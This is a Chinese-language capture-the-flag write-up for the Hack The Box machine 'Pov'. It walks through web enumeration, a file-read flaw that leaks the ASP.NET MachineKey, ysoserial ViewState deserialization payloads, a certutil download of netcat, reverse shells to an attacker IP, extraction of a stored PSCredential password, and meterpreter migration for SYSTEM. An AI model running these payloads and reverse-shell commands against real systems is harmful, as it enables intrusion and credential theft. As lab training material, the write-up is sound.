---
title: HTB-Pov Writeup
date: 2026-03-07T15:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
---
## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --min-rate 10000 -p- 10.129.230.183 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 02:45 EST
Nmap scan report for 10.129.230.183
Host is up (0.11s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.77 seconds
```

靶机只开放了一个 TCP 端口 80。

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -sT -sC -sV -O -p80 10.129.230.183               
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-07 02:46 EST
Nmap scan report for 10.129.230.183
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.49 seconds
```

80 端口暴露了域名 `pov.htb`，添加进 hosts。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo bash -c 'echo "10.129.230.183 pov.htb" >> /etc/hosts' 
                                                                                                        
┌──(kali㉿kali)-[~/Work/Kali]
└─$ tail -n 1 /etc/hosts
10.129.230.183 pov.htb
```

## Web-80 端口渗透

访问 80 端口。

![](Pasted%20image%2020260307154901.png)

![](Pasted%20image%2020260307154953.png)

简单浏览发现网页暴露出了子域名 `dev.pov.htb` 和电子邮件 `sfitz.pov.htb`，进行更详细的子域名爆破。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo ffuf -H "Host: FUZZ.pov.htb" -u http://pov.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pov.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.pov.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 99ms]
:: Progress: [4989/4989] :: Job [1/1] :: 408 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
```

粗略爆破只发现这一个子域名，补充进 hosts 。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ tail -n 1 /etc/hosts
10.129.230.183 pov.htb dev.pov.htb
```

获取网站请求头发现使用的技术栈是 `asp.net`。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ curl -I http://pov.htb
HTTP/1.1 200 OK
Content-Length: 12330
Content-Type: text/html
Last-Modified: Thu, 11 Jan 2024 15:08:44 GMT
Accept-Ranges: bytes
ETag: "9f75a811a044da1:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Sat, 07 Mar 2026 07:58:59 GMT
```

暂时放弃，查看子域名的界面。访问 `dev.pov.htb` 自动重定向至 `/portfolio/defualt.aspx` 界面，进行更详细的目录爆破。

```bash
┌──(kali㉿kali)-[~/Work/Kali]                                                                           
└─$ sudo gobuster dir -u http://dev.pov.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.
txt --exclude-length 188                                                                     
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.pov.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          188
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 302) [Size: 157] [--> http://dev.pov.htb/portfolio/index]
/news                 (Status: 302) [Size: 156] [--> http://dev.pov.htb/portfolio/news]
/images               (Status: 302) [Size: 158] [--> http://dev.pov.htb/portfolio/images]
/full                 (Status: 302) [Size: 156] [--> http://dev.pov.htb/portfolio/full]
/2006                 (Status: 302) [Size: 156] [--> http://dev.pov.htb/portfolio/2006]
/contact              (Status: 302) [Size: 159] [--> http://dev.pov.htb/portfolio/contact]
/download             (Status: 302) [Size: 160] [--> http://dev.pov.htb/portfolio/download]
/crack                (Status: 302) [Size: 157] [--> http://dev.pov.htb/portfolio/crack]
/serial               (Status: 302) [Size: 158] [--> http://dev.pov.htb/portfolio/serial]
/12                   (Status: 302) [Size: 154] [--> http://dev.pov.htb/portfolio/12]
/warez                (Status: 302) [Size: 157] [--> http://dev.pov.htb/portfolio/warez]
/about                (Status: 302) [Size: 157] [--> http://dev.pov.htb/portfolio/about]
/logo                 (Status: 302) [Size: 156] [--> http://dev.pov.htb/portfolio/logo]
/search               (Status: 302) [Size: 158] [--> http://dev.pov.htb/portfolio/search]
/10                   (Status: 302) [Size: 154] [--> http://dev.pov.htb/portfolio/10]
/new                  (Status: 302) [Size: 155] [--> http://dev.pov.htb/portfolio/new]
/11                   (Status: 302) [Size: 154] [--> http://dev.pov.htb/portfolio/11]
/spacer               (Status: 302) [Size: 158] [--> http://dev.pov.htb/portfolio/spacer]
/cgi-bin              (Status: 302) [Size: 159] [--> http://dev.pov.htb/portfolio/cgi-bin]
...
...
```

扫出过多的目录，暂时放弃，继续观察网站。网站上有关于 Stephen FItz 的详细介绍，他的编程语言偏好是 Js、ASP.NET、PHP。


![](Pasted%20image%2020260307160917.png)

还有 What People Say About Me。

![](Pasted%20image%2020260307161026.png)

其中 Michael Abra 说他的 ASP.NET 程序并不安全。

![](Pasted%20image%2020260307161129.png)

使用 BurpSuite 抓包下载简历界面进行分析。

![](Pasted%20image%2020260307161857.png)

发现参数部分有下载的简历 `cv.pdf`，尝试能否读取别的文件。

可以读取 `hosts` 文件，尝试读取 `default.aspx` 文件。

![](Pasted%20image%2020260307211504.png)

读取发现 `default.aspx` 文件还暴露了一个文件 `index.aspx.cs`，继续读取。

![](Pasted%20image%2020260307211610.png)

这个源码是一个 ASP.NET 的文件下载后端处理程序，通过正则表达式过滤字符串来防止遍历。

![](Pasted%20image%2020260307211711.png)

## NTLM 嗅探

在 Kali 中建立 smb 共享。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo impacket-smbserver Enil . -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

在 Repeater 中发送请求至 Kali 主动产生流量，捕捉 ntlm 认证。

![](Pasted%20image%2020260307212459.png)

使用 hashcat 破解捕捉到的 ntlmv2。

```bash
┌──(kali㉿kali)-[~/Work/Kali]                                                                                                                                                     
└─$ sudo hashcat -m 5600 "sfitz::POV:aaaaaaaaaaaaaaaa:f81449b75ac6d8d067a4263a89017faf:0101000000000000809308c735aedc0133a733dccb3bd678000000000100100077004c00440043006a005900450
070000300100077004c00440043006a00590045007000020010006a0075005a0072005200410065005300040010006a0075005a007200520041006500530007000800809308c735aedc0106000400020000000800300030000
0000000000000000000002000003decb96a94ca9d11758ea5764f02eb4e13f900522ca6ff04c77af5c86f93aaa60a001000000000000000000000000000000000000900200063006900660073002f00310030002e003100300
02e00310036002e00350038000000000000000000" /usr/share/wordlists/rockyou.txt              
[sudo] password for kali:                                                                                                                                                         
hashcat (v6.2.6) starting                                                                                                                                                         
                                                                                                                                                                                  
OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]                              
====================================================================================================================================================                              
* Device #1: cpu-sandybridge-13th Gen Intel(R) Core(TM) i9-13900HX, 13912/27888 MB (4096 MB allocatable), 8MCU                                                                    
                                                                                                                                                                                  
Minimum password length supported by kernel: 0                                                                                                                                    
Maximum password length supported by kernel: 256                                                                                                                                  
                                                                                                                                                                                  
Hashes: 1 digests; 1 unique digests, 1 unique salts                                                                                                                               
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                                                                                                      
Rules: 1                                                                                                                                                                          
                                                                                                                                                                                  
Optimizers applied:                                                                      
* Zero-Byte                                                                                                                                                                       
* Not-Iterated                                                                                                                                                                    
* Single-Hash                                                                                                                                                                     
* Single-Salt                                                                                                                                                                     
                                                                                                                                                                                  
ATTENTION! Pure (unoptimized) backend kernels selected.                                                                                                                           
Pure kernels can crack longer passwords, but drastically reduce performance.                                                                                                      
If you want to switch to optimized kernels, append -O to your commandline.                                                                                                        
See the above message to find out about the exact limits.                                                                                                                         
                                                                                                                                                                                  
Watchdog: Temperature abort trigger set to 90c                                           

Host memory required for this attack: 2 MB                                               
                                                                                         
Dictionary cache hit:                       
* Filename..: /usr/share/wordlists/rockyou.txt                                           
* Passwords.: 14344385                      
* Bytes.....: 139921507                     
* Keyspace..: 14344385                      

Cracking performance lower than expected?                                                                                                                                         

* Append -O to the commandline.                                                          
  This lowers the maximum supported password/salt length (usually down to 32).                                                                                                    

* Append -w 3 to the commandline.                                                        
  This can cause your screen to lag.                                                     

* Append -S to the commandline.                                                          
  This has a drastic speed impact but can be better for specific attacks.                                                                                                         
  Typical scenarios are a small wordlist but a large ruleset.                                                                                                                     

* Update your backend API runtime / driver the right way:                                                                                                                         
  https://hashcat.net/faq/wrongdriver                                                    

* Create more work items to make use of your parallelization power:                                                                                                               
  https://hashcat.net/faq/morework                                                       

Approaching final keyspace - workload adjusted.                                                                                                                                   

Session..........: hashcat                                                                                                                                                        
Status...........: Exhausted                                                             
Hash.Mode........: 5600 (NetNTLMv2)                                                      
Hash.Target......: SFITZ::POV:aaaaaaaaaaaaaaaa:f81449b75ac6d8d067a4263...000000                                                                                                   
Time.Started.....: Sat Mar  7 08:27:42 2026 (5 secs)                                                                                                                              
Time.Estimated...: Sat Mar  7 08:27:47 2026 (0 secs)                                                                                                                              
Kernel.Feature...: Pure Kernel                                                           
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)                                                                                                                        
Guess.Queue......: 1/1 (100.00%)                                                         
Speed.#1.........:  2546.6 kH/s (1.38ms) @ Accel:1024 Loops:1 Thr:1 Vec:8                                                                                                         
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)                                                                                                         
Progress.........: 14344385/14344385 (100.00%)                                           
Rejected.........: 0/14344385 (0.00%)                                                    
Restore.Point....: 14344385/14344385 (100.00%)                                           
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1                                                                                                                             
Candidate.Engine.: Device Generator                                                      
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]                                                                                             
Hardware.Mon.#1..: Util: 63%                                                             

Started: Sat Mar  7 08:27:40 2026                                                        
Stopped: Sat Mar  7 08:27:49 2026
```

破解失败。

## 枚举敏感信息

枚举 web.config 的信息。

![](Pasted%20image%2020260307213822.png)

这个 config 将错误重定向至 `portfolio` 界面，其中反序列化的硬编码 MachineKey 被暴露出来，使用 ysoseria.net 定制反序列化的 payload。

## 反序列化漏洞评估

```bash
(base) PS D:\Github Study\Ysoserial\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "ping -n 5 10.10.16.58" --path="/portfolio/default.aspx" --apppath="/portfolio" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
nPqQpSCSipKDKDRkvAbqlarE3rNhxwHi0V5sm%2FegatIQPOCTTuP%2FEzPeUBB5zY8jI808NeqanFQchAWdI%2Bpv5v%2FwhkB4eWZxP%2B%2FywwzGRpYP7qXWXoPi8Ekv%2B9eJAxCIkMGJKvk0ySLq0qhcX%2Fi2dkhY5f8aSLnOWs1O6LVEnEyFMgVa9H9piqSrGB2vjlftTAsu1Rfn7bCQ6lIBo5TkhSMZsuX%2F4w1asgGQwp5DXxisamN7RS%2FRg2N%2FiUMUBeCiM2Zp6GDn0GkYn1rnU9qpnaH%2FXXZWdZQ0iVOmq1WkylOoJIMRFDlSHahAjq73xxxVa%2BnOEtjmb1j7jcMgjgI9tP2fKa1GXiaXf%2FwvYF8k88bbFT%2FKKoTZnM4mqgd1Y50SI9L0ycIoYqNzVvlp9uQ5%2FZKagsAK2EM%2BU6lvcUbQplA5nZqyP8BUiWybT2rEKjjkffs7fSVpdBpebxBiH9Lj5%2BAhAgZhCDqHWwWolFLhiq7fKDd3wIpClRzwmVmgQ66yKfDWdqSr4RojC3841YVigGMHb7Oya565WYW1dJAeoDFr9WpIYoRqkdW6DyeeSfx%2BuEiShCcVnZK%2FD2KmFShcO97WihcJVaarmF4ceRMx4%2FQrfvIha9G1PxNH6732DFcW6C2YAbMPCn4UOyzDlcRP4ZT2oL5DNq3OVzO5kDLDOLvnD%2FipRbr4szmTJZ0MZzNQ2lr92z2iUWNYZV8AOy3E%2F8OJ01cft0C67QUpTIE5%2BN34qHDLCvalL1TOsJCE%2BSZxtZesb2DZjxMRTciWv%2BoF53TWWEUJwIZV%2F6EVQBA6ar9ptwfnxZ01K%2BR9%2F5RamrrGePOlqt8JDoJGl9BeVW16%2By%2FqS0nvEBC2MgapbRlHLguGHGEOMfLCxyfLeZhiU6BPxV6EvjFiMMs%2Bbs6Lin106TVXLjnw%2FPm7PVa%2BS1XL2PqiNZbsuZirWvR7FJChJPvJbEJz8Yvhd1oOJbajtIISeLWp5nXaVZmNxwXmxUgGAy9AoUNlvFQDUj7oIOpg6fRCFaFskIDmOZayJUBN4Nr4l7usLUUZIJPVp8AcVPcc%2FKMRgKRPxF5mj%2BSA%2FhR1syk91hVCst28UKZ6U8%2BbRYr40pEBH9PnsUSQ%2Fmo85quRlR12fB9RlUI%2FHOXYY61nfVXvUv4xX07XgdR5kvg7v7jjtdt3nptfeY6s6exQUEZlJ1r0tD9RCwkJtvCe8rLkZmYMyDcYk8WChqac86oDRpgLAY0jvfC3yb3hqZ%2BJMQOqtD6GcmiciAY27TZjgzlMc%2FpGSshcBwwJXzWepcCM%2BYG9XAdrJtc%3D
```

在 Kali 中捕获流量。

![](Pasted%20image%2020260308000800.png)

获取到 Ping 包，制作下一步的反弹 Shell。

```bash
(base) PS D:\Github Study\Ysoserial\ysoserial\Release> .\ysoserial.exe -p ViewState -g WindowsIdentity `
>>   --decryptionalg="AES" `
>>   --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" `
>>   --validationalg="SHA1" `
>>   --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" `
>>   --path="/portfolio/default.aspx" `
>>   --apppath="/" `
>>   -c "certutil.exe -urlcache -split -f http://10.10.16.58/nc64.exe C:\Programdata\nc64.exe"
Ro8qibCkh5ZWMEa7carikB2ekTCJ5Z9aZ%2FFCYdc5oOD1X2pmTNufL14k9KQ%2FmiVqct1fEAbxQz1uNATCDutk6RyO0oOy4zka5Q%2ByEqzrykFZeKpmYQyPzYaznV5B%2FRn5KOs903N5HH%2FJ8g8322OeKVXulBO%2Bzb5i4rb%2Bqz3BrwiEe4UuLSLO%2BO2jjK0ToCsGNlyL0jR2ZDk8fQFmVecRvQ78dyGpDcf937eDffSR8JrpOxebCHwYkhKv%2FHl8s%2BNlOBuvVlIYs83G9uD%2BsoCXv49eArczNc88noPUGiAB05JeWOxm9FkI8GTSVX6CS8xT6FzU%2Ff4kWpT5uDLGxm9ccCoa4Di9hoSufmgE6%2Bq%2FQidL0FQbi5co44yevrjq3i2%2BOmeRjc8PszPYmmAnpH6XsDzwJzk2GeZRxD5hfjjfpBP8NAOiY25AiLFbzYb1YbVahhoG3izgHrq%2F05inxqa82d8g%2Fqbz0xk48nxL5aev3zJEYX1nvbbI0iXqyl3pJH4I9wMkti2QGTZDRZyauMT0sD4pONtG5vAo5bINovMl%2BIhP6D%2Fc2j5HKboovjuGxifDvsddIAefWA5BU3UzudoTBH%2BEYp3IXdS5E0q1xhuq9N7%2FjNPGuukkQJrNQyO2X3pvVk7m%2FRrpSIdMEDfu8boAcZWpNL%2BRorqyRy7EaMD88DWOYP%2F8ziUv4MMa%2F82i8063OHPf%2FYa31WTWna8eACGE4qz9eGIfPCe4wZ2%2BCVgpGugNTzTjuBqWU4UoEplN%2FmWAscFE7UjICX5KavsKeJ96JHc5tHoDlteTRgl7XC2TlwnR%2F1AY0dv3BmswyDgBXNA5I%2FE46qchQkSP1r2sNs5lyK0OTVi0U%2F7r2MpNYnqkmnP5aJ6OGrBAnZu2VcMJNr3UI4EOPKySreYHOFoI74kcZCe5VcFsALEgozqHWZt%2FRNG0e7zQ0Nkoow26f%2Fltm%2FflykidCCwavgcvxRd5bQAt2sHs1vQTww3W1s%2Fbxx1TbqvYNNC5%2Fl36rEe04GxIu8hB2Q06p4FJSuUiP1ZAo%2F26i11kVAWNUCDlsBZ5UTOq6rx%2F3nZGja7dHU7H2x0DTyH8eYnXGtAJgq1NvK54NZEIs8EZNe6YWvtSCqg42OvVn9GtgvqU5C3rpgNPqFXzhRI3UswPvcCHSdX4ABbL7HAdqNeK39gv1h1kmWuxWhZ4khGC%2FSAR5O7O1Zy5oeY2ChqlKSVOr4ZxG6wYlk%2BufA%2BesXmt7VLvLR0HqnBcZvx7rcwaMZJrTAS1zT0eKiKQSkp79r77GFCVWuheZWzHhHQ%2FivgWRoP%2B22d81xyS4WwkGY1HWO35vwaMLwxyyQ9tkkDnoAOe4GTvWr6PxppTGXt7qkMoNhhC0yM36lTvb9uF0bjBeJf%2FdcVbCF69nlIHqb01vd9La3E9YsujZb7SxH7s9q2y%2BwX1lcX3dZIpilRcOHecOtGhklidygiS0kofYOJJRzwBJObInCJjsY7eoQB2iXPdXtTibAV%2B0nA4jxMeFJq8sePg7KwBPPlHgmI1yWMyXujnwJek6HcsvHXQnNntezmZqlcMYvuwbcubZ7wY5X6aCWAAPtQxsfqCg95CqGG0RjdUySFI72rU8OODXOFhpatPulHiC8fi4wyqG6ooR92ShILyRFzdePgVLtFd7OO5K4qgVv3mGKU3EfIpXlQpFz%2FO5CNQotiu6e%2F7YxqHruxpF8oJIAzDuOOHdBzdxPBA%2B9eSIw8RxrzMvfa2k9nLLhwZTt6L%2F%2FlABf8M5LPTdxxPGHHwdj2iR03LubId460COD1%2BrrBqCKp%2B4DxkeK%2BWXYVKCTK9kDGqxExDirPKtg03%2F3SWmru7OGOI2cnBCS8XEGhdFs9NeU2F%2FTWYfOnkDCYQfxp1h8jylHOg8zpZzAXVmh55feGGP0mZeNwuUN17M2yskrgO7cq2297D0yVOcicyyrJsB4gOkOfR9ptoNlJnxlxXXCVTqi8dIbzM22%2Fu%2BmNd4w%3D%3D
```

```bash
(base) PS D:\Github Study\Ysoserial\ysoserial\Release> .\ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" `
>> --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" `
>> --validationalg="SHA1" `
>> --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" `
>> --path="/portfolio/default.aspx" `
>> --apppath="/" `
>> -c "C:\Programdata\nc64.exe 10.10.16.58 443 -e powershell.exe"
AVhpIHO%2FQQOb4RbHq4QEfl3zqI7MFDUm74sXD%2Bm%2FNtx1R%2BT3dF7gMkVyjwQMqvFg9p1imKLx1INoUW4Sdtl5teWbWOdUNYJjjPRcL%2BWoubAq2srK69eEzW4swqJUnLZgYxjes7DKAEwk9GNqNL8mTTCHViaM21UkH%2Bg0y3jj1fEqjo13RE2mXBHuu74yxgxY9gHAWGULdMp8qvNyin%2BMi%2BXX8PD%2BBylIoiYaxzYT8ExoezsQcQ9dHnirzaxgnJ%2BMx0kpPnZ2KkNgdDbrSQsxwGttCJAUG8g9XnqaFX%2B6D%2BfqCCyEfzn0bLlhH34NaTZC7ApUbcb5xUApkhCncnVc76MP9Sj9h6c5A3NI5zPhoFHizfuJ7bXJ15ooZdHKUY9GwvHnOe%2BJFEVRrnJb1Y7IBp%2FYxCqrbXN4bvxRsE57tTfAzR4kYyErpKNogMGDq0Xoik%2FXZ9Loo00OT507yX7JiHwa3JB8WnNShkVsgAroxY3lyh0OcMaGmdYaCFc90owujvVf6%2F9Le23T8zNYWgvRmsJ4WGBrTdjLiVCCdKs6rZ84WwC2VZ1mw2PWP5m2omz1F5PmnN2IvSb9O3EE%2BkVjHne0bWu0SVLNTQr3loVVvsEpGmlPYZgqK7KVio4e9VSO0R2BOKvcn8ly5AfP7SK2so9qzX9iCuRlqs%2F8QNI4kLPWVEjpgi6ZAV5FyOiMF5eMm4Ah7dpQ0KFjtrIQ%2BD%2FHdEDpN0%2B0DHKEAJ91yV0%2Bck6p0S1lSnkfFhSOkVmdDle109tz%2FyVpoqIq%2BeeIz4hN%2BpOyYsM2%2FE3cCyH5WXbS8eeEQzwMEEqCt61%2Bz1xwM3bvo6G1CQ96tYs3FI%2BezEnEBO0Y%2BAxyF7IOft%2BcLn0sQkdDQlxENCeAGeMT6t3XjbxVGzMX4Zjf2Rpk6eFd93anzuLXsiDVJf1Ju4bWgZuBRSvByizrT%2B0aqzbRIexNGyIp%2BhJp7k4LHx6WFka5rxDWLNfgAHAalKPyqu%2B3%2F3wBoO5xrRTDo6z3YmshLjbc7hVI5WgkofO86yCJwlwbR9AO9IWM2jmZF%2BECqXNJr5DQRqA6tNVJEgHqXChcyR7SJb75pZV0IkeUVn1KKiyHyYx0KwosKSQim%2By2Ol6UIrLM3Ne38SkaT9rUAhBrw60OYG0RLUphgGnRtSl5FCZ3Q4SODK%2F87eSQ4FfMjM6GguA2GCFCDl4rHJRL2v6T02g7KcQlQnWYBGKRT1a%2BD2HhESNk7bQJhvoLk%2BsunBV3xkNH7Lx0QgyIUF%2BDoXtP0L1C8aCR29c1So1CYvp7mC3aLGixYR2VzgTdJmY5u8QfjYHbHwQfk2R8NIg8FmmAyWImcvPZY8crZoMgA2UmmLzXYuuKLmS3p2s3QcAZvycoPkdWam8US8dyE1NHENkmVTRd5IfpfGbnUKdx3q7Z1SpUKenu32XZg6DPXt5ikN2r1%2BJcNz40pOq%2FuMjGqW%2Bm7IKqQdYTvI2chjWWKiVw9Xt8968Qu0annl0cwKBDe0ai%2B0o8v5KMRzoJ7UtyeWlDNVXBjg%2B96r78AAF5atuCx%2BRMZAg8IiDeZPmxLjj3EOldEvQGrbD13Zok8dKKC5k42OO3to47TH3t0sUsajVbCJ0zsVm8kdw%2FuX%2F5nO1F2%2FIfnX0IwjYp%2F4Ummb2t%2Bk4xlJm1KcNdk7YzHyofiY2uBPIsocseVJU2JpUqjcODsHvhV8wAISiZC7f1twT0ZM4R1wseyNO3tw0vfdUMkiG8pxbl6kOtSCa6wkMwxsTEjqu%2BgI4qz1oY9a94VOkwDDKUyilA%2FBagwA8fuPuBdsXIeizk8AZz5MmN9ihydKA75ZrtOgFMk1juFkguR7KaAakIBxJf7FJnvBmid5Gv%2FCGaZgJXp0gE36T9mBjiijOe6VSvmRE0eHIoHu6WkVTqCgG43%2FRk00Gl3%2FeXkA%3D%3D
```

得到初始立足点。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo rlwrap -cAr nc -lvnp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.58] from (UNKNOWN) [10.129.230.183] 49673
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv> whoami
whoami
pov\sfitz
```

## Windows 提权

在 `sfitz` 的 `Document` 中发现文件 `connection.xml`。

```bash
PS C:\Users\sfitz\Documents> cat connection.xml
cat connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```

读取密码。

```bash
PS C:\Users\sfitz\Documents> $cred = import-clixml -Path connection.xml
$cred = import-clixml -Path connection.xml
PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential().UserName
$cred.GetNetworkCredential().UserName
alaading
PS C:\Users\sfitz\Documents> $cred.GetNetworkCredential().Password
$cred.GetNetworkCredential().Password
f8gQ8fynP44ek1m3
```

将 RunasCs.exe 导入靶机。

```bash
PS C:\Programdata\apps> certutil -urlcache -f http://10.10.16.58/RunasCs.exe RunasCs.exe
certutil -urlcache -f http://10.10.16.58/RunasCs.exe RunasCs.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\Programdata\apps> dir
dir


    Directory: C:\Programdata\apps


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        3/13/2026   6:52 AM          51712 RunasCs.exe
```

使用 RunasCs 获取 alaading 的环境。

```bash
PS C:\Programdata\apps> .\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.16.58:408
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.16.58:408

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-71fe9$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4392 created in background.
```

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo rlwrap -cAr nc -lvnp 408              
[sudo] password for kali: 
listening on [any] 408 ...
connect to [10.10.16.58] from (UNKNOWN) [10.129.230.183] 49679
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
pov\alaading
```

枚举权限。

```bash
PS C:\Users\alaading\Desktop> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled 
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.58 LPORT=4444 -f exe -o met.exe
# 复制到 goshs 服务目录
cp met.exe ~/Work/Kali/
```

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.16.58
set LPORT 4444
run

```

```bash
(New-Object Net.WebClient).DownloadFile('http://10.10.16.58/met.exe', 'C:\Programdata\met.exe')
C:\Programdata\met.exe

```

```bash
meterpreter > ps              # 查看进程列表，找 winlogon.exe 的 PID
meterpreter > migrate <PID>   # 例如 migrate 612
meterpreter > getuid          # 确认变成 NT AUTHORITY\SYSTEM

```


```bash
meterpreter > shell
C:\> type C:\Users\Administrator\Desktop\root.txt

```